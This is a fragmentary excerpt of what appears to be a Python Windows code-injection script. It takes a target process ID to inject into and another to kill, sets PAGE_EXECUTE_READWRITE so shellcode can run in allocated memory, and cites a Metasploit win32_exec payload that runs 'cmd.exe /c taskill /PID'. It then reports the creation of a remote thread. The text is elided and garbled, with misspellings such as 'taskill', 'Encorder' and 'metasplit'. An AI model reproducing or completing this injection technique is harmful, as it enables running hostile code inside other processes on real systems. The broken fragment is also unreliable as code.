...
# We need to excute access mask so that our shellcode will
# execute in the memory block me we have allocated

PAGE_EXECUTE_READWRITE = 0x000000040
...
if not sys.argv[1] or not sys.argv[2]:
	print("[*] Code injection: ./code_injection.py <PID to inject> <PID to kill>")
	sys.exit(0)

#/* win32_exec - EXITFUNC=thread CMD=cmd.exe /c taskill /PID AAAA
#Size=159 Encorder=None http"//metasplit.com */
...
print("[*] Remote thread create with a thread ID of: 0x%08x" % (thread_id.value))
